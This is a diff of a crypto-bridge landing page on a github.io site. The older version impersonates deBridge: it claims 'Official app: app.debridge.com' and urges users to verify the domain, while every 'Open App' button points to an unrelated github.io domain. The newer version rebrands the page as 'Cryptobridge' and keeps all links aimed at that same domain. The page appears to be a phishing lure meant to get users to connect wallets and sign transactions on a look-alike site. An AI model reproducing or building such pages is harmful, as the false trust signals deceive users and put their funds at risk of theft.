@@ -1,47 +1,117 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Crypto Bridge - Open deBridge App</title><meta name="description" content="crypto bridge access for cross-chain swaps and transfers via deBridge. Connect wallet, review the route, and open the official app.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://cryptobridge-com.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Crypto Bridge - Open deBridge App"><meta property="og:description" content="crypto bridge access for cross-chain swaps and transfers via deBridge. Connect wallet, review the route, and open the official app.">
-<meta property="og:url" content="https://cryptobridge-com.github.io/"><meta property="og:image" content="https://cryptobridge-com.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Crypto Bridge - Open deBridge App"><meta name="twitter:description" content="crypto bridge access for cross-chain swaps and transfers via deBridge. Connect wallet, review the route, and open the official app."><meta name="twitter:image" content="https://cryptobridge-com.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://cryptobridge-com.github.io/#website", "url": "https://cryptobridge-com.github.io/", "name": "deBridge"}, {"@type": "WebPage", "@id": "https://cryptobridge-com.github.io/#webpage", "url": "https://cryptobridge-com.github.io/", "name": "Crypto Bridge - Open deBridge App", "description": "crypto bridge access for cross-chain swaps and transfers via deBridge. Connect wallet, review the route, and open the official app.", "inLanguage": "en", "isPartOf": {"@id": "https://cryptobridge-com.github.io/#website"}}, {"@type": "Organization", "@id": "https://cryptobridge-com.github.io/#org", "name": "deBridge", "url": "https://cryptobridge-com.github.io/", "logo": "https://cryptobridge-com.github.io/og-cover.png", "sameAs": ["https://x.com/deBridge", "https://github.com/debridge-finance", "https://www.coingecko.com/en/coins/debridge", "https://defillama.com/protocol/debridge"]}, {"@type": "WebApplication", "@id": "https://cryptobridge-com.github.io/#app", "name": "Crypto Bridge", "url": "https://cryptobridge-com.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "crypto bridge access for cross-chain swaps and transfers via deBridge. Connect wallet, review the route, and open the official app.", "featureList": ["Official app: app.debridge.com", "Non-custodial execution layer", "EVM chains and Solana"], "isPartOf": {"@id": "https://cryptobridge-com.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://cryptobridge-com.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is deBridge?", "acceptedAnswer": {"@type": "Answer", "text": "deBridge is a non-custodial execution layer for same-chain and cross-chain actions. It powers swaps, bridge-like transfers, messaging and execution workflows through the deBridge Liquidity Network. For users, that means the app can quote a source asset and destination outcome rather than only moving a wrapped token from one chain to another."}}, {"@type": "Question", "name": "Is deBridge a bridge or a DEX?", "acceptedAnswer": {"@type": "Answer", "text": "deBridge functions more like a cross-chain execution layer than a single-purpose bridge or DEX. It can handle same-chain swaps, cross-chain swaps and programmable actions. The user experience may look like a bridge because you choose a source and destination chain, but the underlying route can include solver liquidity and swaps."}}, {"@type": "Question", "name": "What is the DBR token?", "acceptedAnswer": {"@type": "Answer", "text": "DBR is the token associated with deBridge. Market price, circulating supply and exchange listings should be checked on established data pages such as CoinGecko, while protocol mechanics should be checked in official deBridge resources. Do not trust DBR contract addresses posted in ads, replies or direct messages without verifying against official sources."}}, {"@type": "Question", "name": "Can deBridge move USDC to Base?", "acceptedAnswer": {"@type": "Answer", "text": "Yes, Base is listed among supported deBridge chains, and USDC is described as a reserve asset across supported chains. Route availability still depends on the live app quote, source-chain liquidity and token form. Always verify whether the destination output is native USDC, bridged USDC or another representation before signing."}}, {"@type": "Question", "name": "What happens if deBridge fails?", "acceptedAnswer": {"@type": "Answer", "text": "The deBridge docs state that if a transaction fails before an order is created, funds remain in the user's wallet. If an order is created but not fulfilled, users can cancel and reclaim tokens through the documented flow. The exact action depends on order status, so use the official app or order tracker before signing recovery transactions."}}, {"@type": "Question", "name": "Does deBridge support Solana?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. The official supported-chains documentation lists Solana along with EVM networks. Because Solana and EVM wallets have different address formats and signing flows, users should carefully check the recipient address and destination token in the live app before bridging or swapping across those ecosystems."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="deBridge"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">deBridge</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Crypto Bridge</h1>
-      <div class="bridge-widget" role="group" aria-label="deBridge preview"><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>USDC</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>USDC</b> · Base</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div><div class="bw-netrow"><span class="nl">Networks</span><img src="static/net-ethereum.png" alt="Ethereum" loading="lazy"><img src="static/net-solana.png" alt="Solana" loading="lazy"><img src="static/net-arbitrum.png" alt="Arbitrum" loading="lazy"><img src="static/net-avalanche.png" alt="Avalanche" loading="lazy"><img src="static/net-bnb.png" alt="BNB Chain" loading="lazy"><img src="static/net-polygon.png" alt="Polygon" loading="lazy"><img src="static/net-optimism.png" alt="Optimism" loading="lazy"></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open deBridge ↗</a></div>
-      <p class="hero-note">Live preview — open the official deBridge app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Official app: app.debridge.com</span><span class="trust-chip">Non-custodial execution layer</span><span class="trust-chip">EVM chains and Solana</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Crypto Bridge?</h2><div class="capsule"><strong>deBridge</strong> is a non-custodial execution layer for same-chain and cross-chain actions; its <a href='https://docs.debridge.com/'>official docs</a> describe 0-TVL execution, DLN settlement, <a class="inline-link" href="https://ethereum.org/bridges/" rel="noopener noreferrer">messaging</a>, and recovery paths for unfulfilled orders.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Crypto Bridge at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Cross-chain execution and bridge</b></div><div class="f"><small>Network</small><b><a class="inline-link" href="https://ethereum.org/developers/docs/evm/" rel="noopener noreferrer">EVM chains</a> and Solana</b></div><div class="f"><small>Token</small><b>DBR</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://www.investopedia.com/terms/n/noncustodial-wallet.asp" rel="noopener noreferrer">Non-custodial</a>, 0-TVL architecture</b></div><div class="f"><small>Official app</small><b>app.debridge.com</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>deBridge crypto bridge supported chains</h2><div class="intent-a">deBridge supports cross-chain and same-chain execution across a broad set of networks. The official supported-chains page lists Ethereum, <a class="inline-link" href="https://www.coingecko.com/en/coins/solana" rel="noopener noreferrer">Solana</a>, <a class="inline-link" href="https://docs.arbitrum.io/build-decentralized-apps/token-bridging/token-bridge-erc20" rel="noopener noreferrer">Arbitrum</a>, Avalanche, BNB Chain, Polygon, Optimism, Base, Linea, Flow, Story, Cronos, HyperEVM, Sei, Monad, TRON, Injective and MegaEth. Product availability can still vary by token, route and solver liquidity. For a user searching for a crypto bridge, the important step is to confirm both the source and destination chain in the live deBridge app and verify that the output token is the asset you actually want to receive.</div></div></section><section class="section"><div class="container"><h2>deBridge fees and supported tokens</h2><div class="intent-a">deBridge costs depend on the selected route, token pair, source chain, destination chain and execution product. The docs separate chain support from DLN fee details and explain that <a class="inline-link" href="https://www.investopedia.com/terms/r/reserve-currency.asp" rel="noopener noreferrer">reserve assets</a> include ETH on several EVM networks, wETH on Avalanche, BNB Chain and Polygon, USDC on supported chains and USDT on TRON. Non-reserve assets can be handled through swaps into reserve assets, <a class="inline-link" href="https://www.ledger.com/academy/whats-a-blockchain-bridge" rel="noopener noreferrer">cross-chain transfer</a> and destination swaps. Users should review the app quote for received amount, included fees, solver route and cancellation conditions before signing.</div></div></section><section class="section section-alt"><div class="container"><h2>How deBridge 0-TVL crypto bridge works</h2><div class="intent-a">deBridge is not a traditional <a class="inline-link" href="https://academy.binance.com/en/glossary/lock-and-mint" rel="noopener noreferrer">lock-and-mint bridge</a> with large shared liquidity pools. Its docs describe a non-custodial 0-TVL execution model where user funds pass through <a class="inline-link" href="https://www.ibm.com/topics/smart-contracts" rel="noopener noreferrer">smart contracts</a> on a per-order basis and solvers provide liquidity on demand. If an order is created but not fulfilled, the documentation says users can cancel and reclaim their tokens. This model is why deBridge often appears in searches for safer crypto bridge architecture, but users still need to validate the app domain, recipient address, token and route details.</div></div></section><section class="section"><div class="container"><h2>deBridge transaction stuck or not fulfilled</h2><div class="intent-a">If a deBridge route is not fulfilled after an order is created, the official docs describe cancellation and recovery flows rather than permanent custody by a solver. Users should first check the order in the app or deExplorer, confirm whether the <a class="inline-link" href="https://www.gemini.com/cryptopedia/crypto-bridge-cross-chain-bridge" rel="noopener noreferrer">source transaction</a> created an order, and read the status shown for fulfillment or cancellation. Do not sign recovery transactions from random support links. Use only the official app and documentation, and compare the <a class="inline-link" href="https://www.coinbase.com/learn/crypto-basics/what-is-a-wallet" rel="noopener noreferrer">wallet address</a>, chain, order ID and refund asset before confirming any cancellation.</div></div></section>
-  <section class="section"><div class="container"><h2>How to bridge Crypto Bridge</h2><ol class="steps"><li><b>Open the app</b><span>Use the primary CTA to open app.debridge.com and connect the wallet you intend to send from.</span></li><li><b>Choose the route</b><span>Select the <a class="inline-link" href="https://docs.arbitrum.io/how-arbitrum-works/deep-dives/token-bridging" rel="noopener noreferrer">source chain</a>, source token, <a class="inline-link" href="https://ar5iv.labs.arxiv.org/html/2210.00264" rel="noopener noreferrer">destination chain</a>, destination token, and recipient wallet.</span></li><li><b>Review the quote</b><span>Check the expected output, network, token, route details, fees, limits, and recovery terms before signing.</span></li><li><b>Sign and track</b><span>Approve only the required wallet prompts, then monitor the order in the app or deExplorer.</span></li></ol><div class="cta-band"><div><p>Ready to bridge?</p><p class="sub">Open the official deBridge app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open deBridge ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>deBridge vs traditional crypto bridges</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>deBridge</th><th>Traditional bridge</th></tr></thead><tbody><tr><td>Architecture</td><td>0-TVL, solver-based execution through DLN</td><td>Often <a class="inline-link" href="https://docs.uniswap.org/concepts/protocol/liquidity-providers" rel="noopener noreferrer">shared liquidity pools</a> or lock-and-mint contracts</td></tr><tr><td>Asset flow</td><td>Per-order source contract and destination fulfillment</td><td>Varies by bridge design</td></tr><tr><td>Recovery</td><td>Docs describe cancellation and reclaim paths</td><td>Depends on bridge and message state</td></tr><tr><td>Best fit</td><td>Cross-chain swaps and executable outcomes</td><td>Simple transfers on supported canonical paths</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Crypto Bridge FAQ</h2><div class="faq-list"><details open><summary><h3>What is deBridge?</h3></summary><div>deBridge is a non-custodial execution layer for same-chain and cross-chain actions. It powers swaps, bridge-like transfers, messaging and execution workflows through the deBridge Liquidity Network. For users, that means the app can quote a source asset and destination outcome rather than only moving a <a class="inline-link" href="https://www.ledger.com/academy/whats-a-blockchain-bridge" rel="noopener noreferrer">wrapped token</a> from one chain to another.</div></details><details><summary><h3>Is deBridge a bridge or a DEX?</h3></summary><div>deBridge functions more like a cross-chain execution layer than a single-purpose bridge or DEX. It can handle same-chain swaps, cross-chain swaps and programmable actions. The user experience may look like a bridge because you choose a source and destination chain, but the underlying route can include solver liquidity and swaps.</div></details><details><summary><h3>What is the DBR token?</h3></summary><div>DBR is the token associated with deBridge. Market price, <a class="inline-link" href="https://www.coingecko.com/en/glossary/circulating-supply" rel="noopener noreferrer">circulating supply</a> and exchange listings should be checked on established data pages such as CoinGecko, while protocol mechanics should be checked in official deBridge resources. Do not trust DBR contract addresses posted in ads, replies or direct messages without verifying against official sources.</div></details><details><summary><h3>Can deBridge move USDC to Base?</h3></summary><div>Yes, Base is listed among supported deBridge chains, and USDC is described as a reserve asset across supported chains. Route availability still depends on the live app quote, source-chain liquidity and token form. Always verify whether the destination output is native USDC, bridged USDC or another representation before signing.</div></details><details><summary><h3>What happens if deBridge fails?</h3></summary><div>The deBridge docs state that if a transaction fails before an order is created, funds remain in the user's wallet. If an order is created but not fulfilled, users can cancel and reclaim tokens through the documented flow. The exact action depends on order status, so use the official app or order tracker before signing recovery transactions.</div></details><details><summary><h3>Does deBridge support Solana?</h3></summary><div>Yes. The official supported-chains documentation lists Solana along with EVM networks. Because Solana and EVM wallets have different address formats and signing flows, users should carefully check the recipient address and destination token in the live app before bridging or swapping across those ecosystems.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">Not the official app; verify app.debridge.com before connecting a wallet. Educational content only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Cryptobridge</title>
+  <meta name="description" content="Cryptobridge moves tokens between blockchains from your own wallet.">
+  <link rel="canonical" href="https://cryptobridge-com.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F6F2">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Cryptobridge">
+  <meta property="og:description" content="Cryptobridge moves tokens between blockchains from your own wallet.">
+  <meta property="og:url" content="https://cryptobridge-com.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Cryptobridge">
+  <meta name="twitter:description" content="Cryptobridge moves tokens between blockchains from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://cryptobridge-com.github.io/#website",
+        "url": "https://cryptobridge-com.github.io/",
+        "name": "Cryptobridge",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://cryptobridge-com.github.io/#organization",
+        "name": "Cryptobridge",
+        "url": "https://cryptobridge-com.github.io/"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://cryptobridge-com.github.io/#application",
+        "name": "Cryptobridge",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://cryptobridge-com.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Cryptobridge home">
+      <img src="favicon.png" width="28" height="28" alt="">
+      <span>Cryptobridge</span>
+    </a>
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
+      <a href="https://l2beat.com/scaling/summary" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Cryptobridge">
+      <h1>Cryptobridge</h1>
+      <p class="sub"><strong>Cryptobridge</strong> moves tokens between blockchains from your own wallet.</p>
+    </section>
+
+    <section class="app-card" aria-label="Cross-chain bridge route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img class="token" src="eth.png" width="30" height="30" alt="ETH">
+            <span class="asset">ETH</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch route direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img class="token" src="usdc.png" width="30" height="30" alt="USDC">
+            <span class="asset">USDC</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="footer">Cryptobridge &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length < 2) return;
+
+      var from = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = from;
+      button.classList.toggle("is-swapped");
+    });
+  })();
+  </script>
+</body>
+</html>
